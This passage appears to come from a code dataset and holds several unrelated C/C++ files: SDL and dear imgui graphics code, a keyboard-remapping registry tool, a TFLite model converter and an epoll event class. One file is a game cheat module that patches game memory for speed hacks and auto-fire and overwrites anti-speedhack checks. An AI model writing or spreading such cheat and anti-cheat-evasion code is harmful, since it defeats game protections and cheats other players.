loadedImage);\n\t\tSDL_FreeSurface(loadedImage);\n\t\t//\u0110\u1ea3m b\u1ea3o vi\u1ec7c chuy\u1ec3n \u0111\u1ed5i kh\u00f4ng c\u00f3 l\u1ed7i\n\t\tif (texture == nullptr){\n        /*Uint32 color_key = SDL_MapRGB(loadedImage->format,0x8D,0xC4,0xEB);\n        SDL_SetColorKey(loadedImage,true, color_key);*/\n        logSDLError(std::cout, \"CreateTextureFromSurface\");\n\n\t\t}\n\t}\n\telse {\n\t\tlogSDLError(std::cout, \"LoadBMP\");\n\t}\n\treturn texture;\n}\n\n/**\n* V\u1ebd m\u1ed9t SDL_Texture l\u00ean m\u1ed9t SDL_Renderer t\u1ea1i to\u1ea1 \u0111\u1ed9 (x, y), trong khi\n* gi\u1eef nguy\u00ean chi\u1ec1u r\u1ed9ng v\u00e0 cao c\u1ee7a \u1ea3nh\n* @param tex: texture ngu\u1ed3n ch\u00fang ta mu\u1ed1n v\u1ebd ra\n* @param ren: thi\u1ebft b\u1ecb renderer ch\u00fang ta mu\u1ed1n v\u1ebd v\u00e0o\n* @param x: ho\u00e0nh \u0111\u1ed9\n* @param y: tung \u0111\u1ed9\n*/\n/*void SDLCommonFunc::renderTexture(SDL_Texture *tex, SDL_Renderer *ren, int x, int y)\n{\n\t//Thi\u1ebft l\u1eadp h\u00ecnh ch\u1eef nh\u1eadt \u0111\u00edch m\u00e0 ch\u00fang ta mu\u1ed1n v\u1ebd \u1ea3nh v\u00e0o trong\n\tSDL_Rect dst;\n\tdst.x = x;\n\tdst.y = y;\n\t//Truy v\u1eabn texture \u0111\u1ec3 l\u1ea5y chi\u1ec1u r\u1ed9ng v\u00e0 cao (v\u00e0o chi\u1ec1u r\u1ed9ng v\u00e0 cao t\u01b0\u01a1ng \u1ee9ng c\u1ee7a h\u00ecnh ch\u1eef nh\u1eadt \u0111\u00edch)\n\tSDL_QueryTexture(tex, NULL, NULL, &dst.w, &dst.h);\n    //\u0110\u01b0a to\u00e0n b\u1ed9 \u1ea3nh trong texture v\u00e0o h\u00ecnh ch\u1eef nh\u1eadt \u0111\u00edch\n\tSDL_RenderCopy(ren, tex, NULL, &dst);\n}*/\n\n/**\n* V\u1ebd m\u1ed9t SDL_Texture l\u00ean m\u1ed9t SDL_Renderer t\u1ea1i to\u1ea1 \u0111\u1ed9 (x, y), v\u1edbi\n* chi\u1ec1u r\u1ed9ng v\u00e0 cao m\u1edbi\n* @param tex: texture ngu\u1ed3n ch\u00fang ta mu\u1ed1n v\u1ebd ra\n* @param ren: thi\u1ebft b\u1ecb renderer ch\u00fang ta mu\u1ed1n v\u1ebd v\u00e0o\n* @param x: ho\u00e0nh \u0111\u1ed9\n* @param y: tung \u0111\u1ed9\n* @param w: chi\u1ec1u r\u1ed9ng (m\u1edbi)\n* @param h: \u0111\u1ed9 cao (m\u1edbi)\n*/\nvoid renderTexture(SDL_Texture *tex, SDL_Renderer *ren, int x, int y, int w, int h)\n{\n\t//Thi\u1ebft l\u1eadp h\u00ecnh ch\u1eef nh\u1eadt \u0111\u00edch m\u00e0 ch\u00fang ta mu\u1ed1n v\u1ebd \u1ea3nh v\u00e0o trong\n\tSDL_Rect dst;\n\tdst.x = x;\n\tdst.y = y;\n    dst.w = w;\n    dst.h = h;\n    //\u0110\u01b0a to\u00e0n b\u1ed9 \u1ea3nh trong texture v\u00e0o h\u00ecnh ch\u1eef nh\u1eadt \u0111\u00edch\n    //(\u1ea3nh s\u1ebd co d\u00e3n cho kh\u1edbp v\u1edbi k\u00edch c\u1ee1 m\u1edbi)\n\tSDL_RenderCopy(ren, tex, NULL, &dst);\n}\nvoid    logSDLError(std::ostream& os,\n            const std::string &msg, bool fatal)\n{\n        os << msg << \" Error: \" << SDL_GetError() << std::endl;\n        if (fatal) {\n        SDL_Quit();\n        exit(1);\n    }\n}\nvoid quitSDL(SDL_Window* window, SDL_Renderer* renderer)\n{\n        SDL_DestroyRenderer(renderer);\n        SDL_DestroyWindow(window);\n        SDL_Quit();\n\n}\nvoid initSDL(SDL_Window* &window, SDL_Renderer* &renderer)\n{\nif (SDL_Init(SDL_INIT_EVERYTHING) != 0)\n    logSDLError(std::cout, \"SDL_Init\", true);\n    window = SDL_CreateWindow(WINDOW_TITLE.c_str(), SDL_WINDOWPOS_CENTERED,\n    SDL_WINDOWPOS_CENTERED, SCREEN_WIDTH, SCREEN_HEIGHT, SDL_WINDOW_SHOWN);\n    //window = SDL_CreateWindow(WINDOW_TITLE.c_str(), SDL_WINDOWPOS_CENTERED,\n    //SDL_WINDOWPOS_CENTERED, SCREEN_WIDTH, SCREEN_HEIGHT, SDL_WINDOW_FULLSCREEN_DESKTOP);\nif (window == nullptr) logSDLError(std::cout, \"CreateWindow\", true);\n    //Khi th\u00f4ng th\u01b0\u1eddng ch\u1ea1y v\u1edbi m\u00f4i tr\u01b0\u1eddng b\u00ecnh th\u01b0\u1eddng \u1edf nh\u00e0\n    renderer = SDL_CreateRenderer(window, -1, SDL_RENDERER_ACCELERATED |\n    SDL_RENDERER_PRESENTVSYNC);\n    //Khi ch\u1ea1y \u1edf m\u00e1y th\u1ef1c h\u00e0nh WinXP \u1edf tr\u01b0\u1eddng (m\u00e1y \u1ea3o)\n    //renderer = SDL_CreateSoftwareRenderer(SDL_GetWindowSurface(window));\nif (renderer == nullptr) logSDLError(std::cout, \"CreateRenderer\", true);\n    SDL_SetHint(SDL_HINT_RENDER_SCALE_QUALITY, \"linear\");\n    SDL_RenderSetLogicalSize(renderer, SCREEN_WIDTH, SCREEN_HEIGHT);\n}\nvoid waitUntilKeyPressed()\n{\nSDL_Event e;\nwhile (true) {\n        if ( SDL_WaitEvent(&e) != 0 &&\n        (e.type == SDL_KEYDOWN || e.type == SDL_QUIT) )\n        return;\n\n    }\n}\n\n",
    "// dear imgui, v1.90.7 WIP\n// (drawing and font code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] STB libraries implementation\n// [SECTION] Style functions\n// [SECTION] ImDrawList\n// [SECTION] ImTriangulator, ImDrawList concave polygon fill\n// [SECTION] ImDrawListSplitter\n// [SECTION] ImDrawData\n// [SECTION] Helpers ShadeVertsXXX functions\n// [SECTION] ImFontConfig\n// [SECTION] ImFontAtlas\n// [SECTION] ImFontAtlas glyph ranges helpers\n// [SECTION] ImFontGlyphRangesBuilder\n// [SECTION] ImFont\n// [SECTION] ImGui Internal Render Helpers\n// [SECTION] Decompression code\n// [SECTION] Default font data (ProggyClean.ttf)\n\n*/\n\n#if defined(_MSC_VER) && !defined(_CRT_SECURE_NO_WARNINGS)\n#define _CRT_SECURE_NO_WARNINGS\n#endif\n\n#ifndef IMGUI_DEFINE_MATH_OPERATORS\n#define IMGUI_DEFINE_MATH_OPERATORS\n#endif\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n#include \"imgui_internal.h\"\n#ifdef IMGUI_ENABLE_FREETYPE\n#include \"misc/freetype/imgui_freetype.h\"\n#endif\n\n#include <stdio.h>      // vsnprintf, sscanf, printf\n\n// Visual Studio warnings\n#ifdef _MSC_VER\n#pragma warning (disable: 4127)     // condition expression is constant\n#pragma warning (disable: 4505)     // unreferenced local function has been removed (stb stuff)\n#pragma warning (disable: 4996)     // 'This function or variable may be unsafe': strcpy, strdup, sprintf, vsnprintf, sscanf, fopen\n#pragma warning (disable: 26451)    // [Static Analyzer] Arithmetic overflow : Using operator 'xxx' on a 4 byte value and then casting the result to a 8 byte value. Cast the value to the wider type before calling operator 'xxx' to avoid overflow(io.2).\n#pragma warning (disable: 26812)    // [Static Analyzer] The enum type 'xxx' is unscoped. Prefer 'enum class' over 'enum' (Enum.3). [MSVC Static Analyzer)\n#endif\n\n// Clang/GCC warnings with -Weverything\n#if defined(__clang__)\n#if __has_warning(\"-Wunknown-warning-option\")\n#pragma clang diagnostic ignored \"-Wunknown-warning-option\"         // warning: unknown warning group 'xxx'                      // not all warnings are known by all Clang versions and they tend to be rename-happy.. so ignoring warnings triggers new warnings on some configuration. Great!\n#endif\n#pragma clang diagnostic ignored \"-Wunknown-pragmas\"                // warning: unknown warning group 'xxx'\n#pragma clang diagnostic ignored \"-Wold-style-cast\"                 // warning: use of old-style cast                            // yes, they are more terse.\n#pragma clang diagnostic ignored \"-Wfloat-equal\"                    // warning: comparing floating point with == or != is unsafe // storing and comparing against same constants ok.\n#pragma clang diagnostic ignored \"-Wglobal-constructors\"            // warning: declaration requires a global destructor         // similar to above, not sure what the exact difference is.\n#pragma clang diagnostic ignored \"-Wsign-conversion\"                // warning: implicit conversion changes signedness\n#pragma clang diagnostic ignored \"-Wzero-as-null-pointer-constant\"  // warning: zero as null pointer constant                    // some standard header variations use #define NULL 0\n#pragma clang diagnostic ignored \"-Wcomma\"                          // warning: possible misuse of comma operator here\n#pragma clang diagnostic ignored \"-Wreserved-id-macro\"              // warning: macro name is a reserved identifier\n#pragma clang diagnostic ignored \"-Wdouble-promotion\"               // warning: implicit conversion from 'float' to 'double' when passing argument to function  // using printf() is a misery with this as C++ va_arg ellipsis changes float to double.\n#pragma clang diagnostic ignored \"-Wimplicit-int-float-conversion\"  // warning: implicit conversion from 'xxx' to 'float' may lose precision\n#pragma clang diagnostic ignored \"-Wreserved-identifier\"            // warning: identifier '_Xxx' is reserved because it starts with '_' followed by a capital letter\n#pragma clang diagnostic ignored \"-Wunsafe-buffer-usage\"            // warning: 'xxx' is an unsafe pointer used for buffer access\n#elif defined(__GNUC__)\n#pragma GCC diagnostic ignored \"-Wpragmas\"                  // warning: unknown option after '#pragma GCC diagnostic' kind\n#pragma GCC diagnostic ignored \"-Wunused-function\"          // warning: 'xxxx' defined but not used\n#pragma GCC diagnostic ignored \"-Wdouble-promotion\"         // warning: implicit conversion from 'float' to 'double' when passing argument to function\n#pragma GCC diagnostic ignored \"-Wconversion\"               // warning: conversion to 'xxxx' from 'xxxx' may alter its value\n#pragma GCC diagnostic ignored \"-Wstack-protector\"          // warning: stack protector not protecting local variables: variable length buffer\n#pragma GCC diagnostic ignored \"-Wclass-memaccess\"          // [__GNUC__ >= 8] warning: 'memset/memcpy' clearing/writing an object of type 'xxxx' with no trivial copy-assignment; use assignment or value-initialization instead\n#endif\n\n//-------------------------------------------------------------------------\n/",
    "#include <iostream>\r\n#include <algorithm>\r\n#include \"keyboard_re-layout.h\"\r\n#include \"keyboard_lookup_table.h\"\r\n\r\n\r\nvoid control_panel()\r\n{\r\n    const std::string key_path{KEYBOARD_SUB_STR};\r\n    const std::string value_name{REGISTER_NAME};\r\n    KeyboardRelayout keyboard_re_layout(key_path, value_name);\r\n\r\n    while(true) {\r\n        int choice;\r\n        std::cout << \"Choose an option:\\n1. Create or Update Registry Key\\n2. Delete Registry Value\\n\";\r\n        std::cin >> choice;\r\n        try {\r\n            switch(choice) {\r\n                case 1: {\r\n                    print_keys();\r\n\r\n                    std::cout << \"Please choose one of them above and write below\\n\";\r\n\r\n                    enter_first_key_again:\r\n                    std::cout << \"Choose your First Key Name:\\n\";\r\n                    std::string first_key_name;\r\n                    std::cin >> first_key_name;\r\n\r\n                    //UPPERCASE\r\n                    std::transform(first_key_name.begin(), first_key_name.end(), first_key_name.begin(),\r\n                                   [](unsigned char c)\r\n                                   {\r\n                                       return std::toupper(c);\r\n                                   });\r\n                    //TRIM\r\n                    first_key_name.erase(0, first_key_name.find_first_not_of(\" \\n\\r\\t\"));\r\n                    first_key_name.erase(first_key_name.find_last_not_of(\" \\n\\r\\t\") + 1);\r\n\r\n                    int key_1 = key_code_in_map(first_key_name);\r\n                    if(key_1 != -1) { ; //NOTHING\r\n                    }\r\n                    else {\r\n                        std::cout << \"Please enter valid key!\" << '\\n';\r\n                        goto enter_first_key_again;\r\n                    }\r\n\r\n                    const auto key_first = static_cast<uint8_t>(key_1);\r\n\r\n                    enter_second_key_again:\r\n                    std::cout << \"Choose your Second Key Name:\\n\";\r\n                    std::string second_key_name;\r\n                    std::cin >> second_key_name;\r\n\r\n                    //UPPERCASE\r\n                    std::transform(second_key_name.begin(), second_key_name.end(), second_key_name.begin(),\r\n                                   [](unsigned char c)\r\n                                   {\r\n                                       return std::toupper(c);\r\n                                   });\r\n\r\n                    //TRIM\r\n                    second_key_name.erase(0, second_key_name.find_first_not_of(\" \\n\\r\\t\"));\r\n                    second_key_name.erase(second_key_name.find_last_not_of(\" \\n\\r\\t\") + 1);\r\n\r\n                    int key_2 = key_code_in_map(second_key_name);\r\n                    if(key_2 != -1) { ; //NOTHING\r\n                    }\r\n                    else {\r\n                        std::cout << \"Please enter valid key!\" << std::endl;\r\n                        goto enter_second_key_again;\r\n                    }\r\n\r\n                    const auto key_second = static_cast<uint8_t>(key_2);\r\n\r\n                    const uint8_t operand_first{static_cast<const uint8_t>(key_first)};\r\n                    const uint8_t operand_second{static_cast<const uint8_t>(key_second)};\r\n\r\n                    auto binary_data_vector = keyboard_re_layout.update_binary_data(operand_first, operand_second);\r\n                    auto hKey = keyboard_re_layout.create_or_open_registry_key();\r\n\r\n                    if(keyboard_re_layout.set_registry_binary_value(hKey, binary_data_vector)) {\r\n                        keyboard_re_layout.close_registry_key(hKey);\r\n                    }\r\n                    else {\r\n                        keyboard_re_layout.close_registry_key(hKey);\r\n                    }\r\n                    break;\r\n                }\r\n                case 2: {\r\n                    auto hKey = keyboard_re_layout.create_or_open_registry_key();\r\n\r\n                    if(keyboard_re_layout.delete_registry_value(hKey)) {\r\n                        keyboard_re_layout.close_registry_key(hKey);\r\n                    }\r\n                    else {\r\n                        keyboard_re_layout.close_registry_key(hKey);\r\n                    }\r\n                    break;\r\n                }\r\n                default:\r\n                    std::cerr << \"Invalid choice.\" << '\\n';\r\n                    break;\r\n            }\r\n        }\r\n        catch(const std::runtime_error &ex) {\r\n            std::cerr << \"Exception occurred: \" << ex.what() << '\\n';\r\n        }\r\n\r\n        std::cout << \"Press Enter to continue or Ctrl+C to exit...\" << '\\n';\r\n        std::cin.ignore(); // Clear the newline character from the buffer\r\n        std::cin.get(); // Wait for Enter key\r\n    }\r\n}\r\n\r\n\r\n\r\n",
    "#include \"main.h\"\n#include \"SpeedHack.h\"\n#include \"ImguiDraw.h\"\ndouble *TimeSpeed;\ndouble* HigePingBase[5];\nfloat* TimtOut[2];\nfloat* CheckSpeedHack;\nbyte* Check;\nUINT* NubSpeed, * PlayerSpeed;\nint* GameSce;\ndouble* VeryHigeSpeedHack = nullptr;\nint GetVk() {\n\tswitch (((int)Vk.value)){\n\tcase 0:\n\t\treturn VK_E;\n\tcase 1:\n\t\treturn VK_SHIFT;\n\tcase 2:\n\t\treturn VK_V;\n\tcase 3:\n\t\treturn VK_R;\n\tdefault:\n\t\treturn VK_E;\n\t}\n}\n\nvoid SpeedHack_::AutoResetRoom(){\n\tif (this->IsNeedResetRoom) {\n\t\tg_pEngine->pfnClientCmd(XorString(\"fs_lazy_precache 2;retry\"));\n\t\tIsNeedResetRoom = false;\n\t}\n}\n\nvoid SpeedHack_::StartSpeedHack() {\n\tif (BugScer.value && !SecHack) *GameSce = -1;\n\tif (!ImguiDraw::IsDeveloper) {\n\t\tAutoResetRoom();\n\t\tif (!IsSpeedStart)FirstTime = clock();\n\t\tif (clock() - FirstTime >= 8000) this->IsNeedResetRoom = true;\n\t}\n\tIsSpeedStart = true;\n\t*TimeSpeed = 0.0;\n\t*NubSpeed = 0;\n\t*PlayerSpeed = 0;\n\tswitch ((int)HighUpload.value) {\n\tcase 1:\n\t\t*VeryHigeSpeedHack = 0.000008;\n\t\tbreak;\n\tcase 2:\n\t\t*VeryHigeSpeedHack = 0.0008;\n\t\tbreak;\n\tcase 3:\n\t\t*VeryHigeSpeedHack = 10;\n\t\tbreak;\n\t}\n}\n\nvoid SpeedHack_::StartPassDropClient(){\n\t*((UINT*)TimtOut[0]) = Inf;\n\t*((UINT*)TimtOut[1]) = NInf;\n\t*((UINT*)CheckSpeedHack) = Inf;\n\t*Check = 0;\n}\n\nvoid SpeedHack_::EndSpeedHack(){\n\tthis->fire = false;\n\tthis->SecHack = false;\n\tIsNeedResetRoom = false;\n\tIsSpeedStart = false;\n\tif (*GameSce == -1)*GameSce = 2;\n\tFuckHigePing();\n\tG_VguiPrint->PrintUnf_8(0, XorString(u8\"\u00bc\u00d3\u00cb\u00d9\u00cd\u00ea\u00b1\u00cf\u00a1\u00a3\"), 255, 0, 0, -1.0f, -1.0f, -1.0f, -1.0f, -1.0f, -1.0f, 0, 0);\n}\n\nvoid SpeedHack_::AutoFire(usercmd_s* cmd){\n\tswitch ((int)autoFire.value){\n\tcase 1:\n\t\tcmd->buttons = !fire ? cmd->buttons | IN_ATTACK : cmd->buttons & ~IN_ATTACK;\n\t\tfire = !fire ? true : false;\n\t\treturn;\n\tcase 2:\n\t\tcmd->buttons = !fire ? cmd->buttons | IN_ATTACK2 : cmd->buttons & ~IN_ATTACK2;\n\t\tfire = !fire ? true : false;\n\t\treturn;\n\tcase 3:\n\t\tcmd->buttons = !fire ? cmd->buttons | IN_ATTACK : cmd->buttons & ~IN_ATTACK;\n\t\tcmd->buttons = !fire ? cmd->buttons | IN_ATTACK2 : cmd->buttons & ~IN_ATTACK2;\n\t\tfire = !fire ? true : false;\n\t\treturn;\n\t}\n}\n\nvoid FuckHigePing() {\n\t*HigePingBase[0] = 0.0;\n\t*HigePingBase[1] = 0.0;\n\t*HigePingBase[2] = 0.0;\n\t*HigePingBase[3] = 0.0;\n\t*((float*)HigePingBase[4]) = 0.0f;\n\t*VeryHigeSpeedHack = DefineSpeed;\n}\n\nvoid __stdcall StartSecHack() {\n\t*GameSce = -1;\n\tSleep(1000);\n\t*GameSce = 2;\n}",
    "//\n// Created by 18101 on 2024/8/4.\n//\n#include \"Factory.h\"\n\n// \u5177\u4f53\u4ea7\u54c1\u7c7b\u5b9e\u73b0\nvoid ProductA::process() {\n    if (strategy) {\n        strategy->process();\n    } else {\n        std::cout << \"Wrong ProductA.\" << std::endl;\n    }\n}\n\nvoid ProductB::process() {\n    if (strategy) {\n        strategy->process();\n    } else {\n        std::cout << \"Wrong ProductB.\" << std::endl;\n    }\n}\n\nvoid ProductC::process() {\n    if (strategy) {\n        strategy->process();\n    } else {\n        std::cout << \"Wrong ProductC.\" << std::endl;\n    }\n}\n\n// \u7b56\u7565\u5de5\u5382\u7c7b\u5b9e\u73b0\nstd::unique_ptr<Strategy> StrategyFactory::createStrategy(const std::string& type) {\n    if (type == \"Heating\") {\n        return std::make_unique<HeatingStrategy>();\n    } else if (type == \"Cooling\") {\n        return std::make_unique<CoolingStrategy>();\n    } else if (type == \"Mixing\") {\n        return std::make_unique<MixingStrategy>();\n    } else {\n        return nullptr;\n    }\n}\n\n// \u5de5\u5382\u7c7b\u5b9e\u73b0\nstd::unique_ptr<Product> ProductFactory::createProduct(const std::string& type) {\n    if (type == \"ProductA\") {\n        return std::make_unique<ProductA>();\n    } else if (type == \"ProductB\") {\n        return std::make_unique<ProductB>();\n    } else if (type == \"ProductC\") {\n        return std::make_unique<ProductC>();\n    } else {\n        return nullptr;\n    }\n}\n",
    "/*\n * iaxxx_tflite_model_converter.c  --  google hotword model conversion for IAXXX\n *\n * This program is free software; you can redistribute it and/or modify\n * it under the terms of the GNU General Public License version 2 and\n * only version 2 as published by the Free Software Foundation.\n *\n * This program is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n * GNU General Public License for more details.\n */\n\n#include \"iaxxx_tflite_model_converter.h\"\n\n//using namespace tflite;\n\nstatic const uint32_t crc_table_mvm[] = {\n  0x00000000, 0x77073096, 0xee0e612c, 0x990951ba, 0x076dc419, 0x706af48f,\n  0xe963a535, 0x9e6495a3, 0x0edb8832, 0x79dcb8a4, 0xe0d5e91e, 0x97d2d988,\n  0x09b64c2b, 0x7eb17cbd, 0xe7b82d07, 0x90bf1d91, 0x1db71064, 0x6ab020f2,\n  0xf3b97148, 0x84be41de, 0x1adad47d, 0x6ddde4eb, 0xf4d4b551, 0x83d385c7,\n  0x136c9856, 0x646ba8c0, 0xfd62f97a, 0x8a65c9ec, 0x14015c4f, 0x63066cd9,\n  0xfa0f3d63, 0x8d080df5, 0x3b6e20c8, 0x4c69105e, 0xd56041e4, 0xa2677172,\n  0x3c03e4d1, 0x4b04d447, 0xd20d85fd, 0xa50ab56b, 0x35b5a8fa, 0x42b2986c,\n  0xdbbbc9d6, 0xacbcf940, 0x32d86ce3, 0x45df5c75, 0xdcd60dcf, 0xabd13d59,\n  0x26d930ac, 0x51de003a, 0xc8d75180, 0xbfd06116, 0x21b4f4b5, 0x56b3c423,\n  0xcfba9599, 0xb8bda50f, 0x2802b89e, 0x5f058808, 0xc60cd9b2, 0xb10be924,\n  0x2f6f7c87, 0x58684c11, 0xc1611dab, 0xb6662d3d, 0x76dc4190, 0x01db7106,\n  0x98d220bc, 0xefd5102a, 0x71b18589, 0x06b6b51f, 0x9fbfe4a5, 0xe8b8d433,\n  0x7807c9a2, 0x0f00f934, 0x9609a88e, 0xe10e9818, 0x7f6a0dbb, 0x086d3d2d,\n  0x91646c97, 0xe6635c01, 0x6b6b51f4, 0x1c6c6162, 0x856530d8, 0xf262004e,\n  0x6c0695ed, 0x1b01a57b, 0x8208f4c1, 0xf50fc457, 0x65b0d9c6, 0x12b7e950,\n  0x8bbeb8ea, 0xfcb9887c, 0x62dd1ddf, 0x15da2d49, 0x8cd37cf3, 0xfbd44c65,\n  0x4db26158, 0x3ab551ce, 0xa3bc0074, 0xd4bb30e2, 0x4adfa541, 0x3dd895d7,\n  0xa4d1c46d, 0xd3d6f4fb, 0x4369e96a, 0x346ed9fc, 0xad678846, 0xda60b8d0,\n  0x44042d73, 0x33031de5, 0xaa0a4c5f, 0xdd0d7cc9, 0x5005713c, 0x270241aa,\n  0xbe0b1010, 0xc90c2086, 0x5768b525, 0x206f85b3, 0xb966d409, 0xce61e49f,\n  0x5edef90e, 0x29d9c998, 0xb0d09822, 0xc7d7a8b4, 0x59b33d17, 0x2eb40d81,\n  0xb7bd5c3b, 0xc0ba6cad, 0xedb88320, 0x9abfb3b6, 0x03b6e20c, 0x74b1d29a,\n  0xead54739, 0x9dd277af, 0x04db2615, 0x73dc1683, 0xe3630b12, 0x94643b84,\n  0x0d6d6a3e, 0x7a6a5aa8, 0xe40ecf0b, 0x9309ff9d, 0x0a00ae27, 0x7d079eb1,\n  0xf00f9344, 0x8708a3d2, 0x1e01f268, 0x6906c2fe, 0xf762575d, 0x806567cb,\n  0x196c3671, 0x6e6b06e7, 0xfed41b76, 0x89d32be0, 0x10da7a5a, 0x67dd4acc,\n  0xf9b9df6f, 0x8ebeeff9, 0x17b7be43, 0x60b08ed5, 0xd6d6a3e8, 0xa1d1937e,\n  0x38d8c2c4, 0x4fdff252, 0xd1bb67f1, 0xa6bc5767, 0x3fb506dd, 0x48b2364b,\n  0xd80d2bda, 0xaf0a1b4c, 0x36034af6, 0x41047a60, 0xdf60efc3, 0xa867df55,\n  0x316e8eef, 0x4669be79, 0xcb61b38c, 0xbc66831a, 0x256fd2a0, 0x5268e236,\n  0xcc0c7795, 0xbb0b4703, 0x220216b9, 0x5505262f, 0xc5ba3bbe, 0xb2bd0b28,\n  0x2bb45a92, 0x5cb36a04, 0xc2d7ffa7, 0xb5d0cf31, 0x2cd99e8b, 0x5bdeae1d,\n  0x9b64c2b0, 0xec63f226, 0x756aa39c, 0x026d930a, 0x9c0906a9, 0xeb0e363f,\n  0x72076785, 0x05005713, 0x95bf4a82, 0xe2b87a14, 0x7bb12bae, 0x0cb61b38,\n  0x92d28e9b, 0xe5d5be0d, 0x7cdcefb7, 0x0bdbdf21, 0x86d3d2d4, 0xf1d4e242,\n  0x68ddb3f8, 0x1fda836e, 0x81be16cd, 0xf6b9265b, 0x6fb077e1, 0x18b74777,\n  0x88085ae6, 0xff0f6a70, 0x66063bca, 0x11010b5c, 0x8f659eff, 0xf862ae69,\n  0x616bffd3, 0x166ccf45, 0xa00ae278, 0xd70dd2ee, 0x4e048354, 0x3903b3c2,\n  0xa7672661, 0xd06016f7, 0x4969474d, 0x3e6e77db, 0xaed16a4a, 0xd9d65adc,\n  0x40df0b66, 0x37d83bf0, 0xa9bcae53, 0xdebb9ec5, 0x47b2cf7f, 0x30b5ffe9,\n  0xbdbdf21c, 0xcabac28a, 0x53b39330, 0x24b4a3a6, 0xbad03605, 0xcdd70693,\n  0x54de5729, 0x23d967bf, 0xb3667a2e, 0xc4614ab8, 0x5d681b02, 0x2a6f2b94,\n  0xb40bbe37, 0xc30c8ea1, 0x5a05df1b, 0x2d02ef8d\n};\n\n#define LO_SHIFT -1\n#define HI_SHIFT 6\n#define MVM16BX8B_FAST_Q 23\n#define MVM16BX8B_FAST_EXP_FXP (32 - MVM16BX8B_FAST_Q)\n\n// optimize me\n// input pCoeffs order is  filter_val = filter_data[out_c * accum_depth + d];\nint FullyConnectedMap8bitCoeffs(int8_t *pMapped, const int8_t *pCoeffs, int m,\n                                int n) {\n  int nFullRowGroups =\n      (m + (1 << LOG2_ROWS_PER_GROUP) - 1) >> LOG2_ROWS_PER_GROUP;\n\n  int nFullColBlocks = (n + 1) >> LOG2_COLS_PER_BLOCK;\n  int nFullBlockColsAligned2 = nFullColBlocks << LOG2_COLS_PER_BLOCK;\n\n  const int8_t *src = pCoeffs;\n  int8_t *dst = pMapped;\n\n  int mappedSize = nFullRowGroups * nFullColBlocks * BLOCK_SIZE;\n  // int weightSize = m*n;\n  if (pMapped && pCoeffs) {\n    // Half column blocks from full row groups\n    for (int group = 0; group < nFullRowGroups; group++) {\n      for (int block = 0; block < nFullBlockColsAligned2; block++) {\n        for (int j = 0; j < ROWS_PER_GROUP; j++) {\n          int blkIdx = block;\n          int grpIdx = group * ROWS_PER_GROUP + j;\n\n          int dstIdx = group * ROWS_PER_GROUP * nFullBlockColsAligned2 +\n                       block * ROWS_PER_GROUP + j;\n\n          if (blo",
    "#include \"Channel.h\"\nChannel::Channel(EventLoop* loop, int fd ) : loop_(loop), fd_(fd)\n{\n}\n\nChannel::~Channel()\n{\n}\n\nint Channel::fd() // \u8fd4\u56defd_\u6210\u5458\n{\n    return fd_;\n}\n\nvoid Channel::useet() // \u91c7\u7528\u8fb9\u7f18\u89e6\u53d1\n{\n    events_ = events_ | EPOLLET;\n}\n\nvoid Channel::enablereading() // \u8ba9epoll_wait()\u76d1\u89c6fd_\u7684\u8bfb\u4e8b\u4ef6\n{\n    events_ = events_ | EPOLLIN;\n    loop_->updatechannel(this);\n}\n\nvoid Channel::disablereading()      //\u53d6\u6d88\u8bfb\u4e8b\u4ef6\n{\n    events_ &=~EPOLLIN;\n    loop_->updatechannel(this);\n}\n\nvoid Channel::enablewriting()       //\u6ce8\u518c\u5199\u4e8b\u4ef6\n{\n    events_ |= EPOLLOUT;\n    loop_->updatechannel(this);\n}\n\nvoid Channel::disablewriting()      //\u53d6\u6d88\u5199\u4e8b\u4ef6\n{\n    events_ &= ~EPOLLOUT;\n    loop_->updatechannel(this);\n}\n\nvoid Channel::disableall()          //\u53d6\u6d88\u5168\u90e8\u7684\u4e8b\u4ef6\n{\n    events_ = 0;\n    loop_->updatechannel(this);\n}\n\nvoid Channel::remove()              //\u4ece\u4e8b\u4ef6\u5faa\u73af\u4e2d\u5220\u9664Channel\n{\n    //disableall();\n    loop_->removechannel(this); //\u4ece\u7ea2\u9ed1\u6811\u4e0a\u5220\u9664fd\n}\n\nvoid Channel::setinepoll() // \u628ainepoll_\u6210\u5458\u7684\u503c\u8bbe\u7f6e\u4e3atrue\n{\n    inepoll_ = true;\n}\n\nvoid Channel::setrevent(uint32_t ev) // \u8bbe\u7f6erevents_\u7684\u503c\u4e3aev\n{\n    revents_ = ev;\n}\n\nbool Channel::inpoll() // \u8fd4\u56deinepoll\u6210\u5458\n{\n    return inepoll_;\n}\n\nuint32_t Channel::events() // \u8fd4\u56deevents_\u6210\u5458\n{\n    return events_;\n}\n\nuint32_t Channel::revents() // \u8fd4\u56derevents_\u6210\u5458\n{\n    return revents_;\n}\n\nvoid Channel::handleevent() // \u4e8b\u4ef6\u5904\u7406\u51fd\u6570\uff0cepoll_wait()\u8fd4\u56de\u7684\u65f6\u5019\uff0c\u6267\u884c\u5b83\n{\n    ////////////////////////////////////////////////////////////////////////\n    if (revents_ & EPOLLRDHUP)                // \u5bf9\u65b9\u5df2\u5173\u95ed\uff0c\u6709\u4e9b\u7cfb\u7edf\u68c0\u6d4b\u4e0d\u5230\uff0c\u53ef\u4ee5\u4f7f\u7528EPOLLIN\uff0crecv()\u8fd4\u56de0\u3002\n    {\n        //printf(\"EPOLLRDHUP\\n\");\n        //remove();       //\u4ece\u4e8b\u4ef6\u5faa\u73af\u4e2d\u5220\u9664Channel\n        closecallback_();\n\n    }                                //  \u666e\u901a\u6570\u636e  \u5e26\u5916\u6570\u636e\n    else if (revents_ & (EPOLLIN|EPOLLPRI))   // \u63a5\u6536\u7f13\u51b2\u533a\u4e2d\u6709\u6570\u636e\u53ef\u4ee5\u8bfb\u3002\n    {\n        //printf(\"EPOLLIN|EPOLLPRI\\n\");\n        readcallback_();\n    }\n    else if (revents_ & EPOLLOUT)             // \u6709\u6570\u636e\u9700\u8981\u5199\uff0c\u6682\u65f6\u6ca1\u6709\u4ee3\u7801\uff0c\u4ee5\u540e\u518d\u8bf4\u3002\n    {\n        //printf(\"EPOLLOUT\\n\");\n        writecallback_();\n    }\n    else                                            // \u5176\u5b83\u4e8b\u4ef6\uff0c\u90fd\u89c6\u4e3a\u9519\u8bef\u3002\n    {\n        //printf(\"others\\n\");\n        //remove();\n        errorcallback_();\n    }\n}\n\n\nvoid Channel::setreadcallback(std::function<void()> 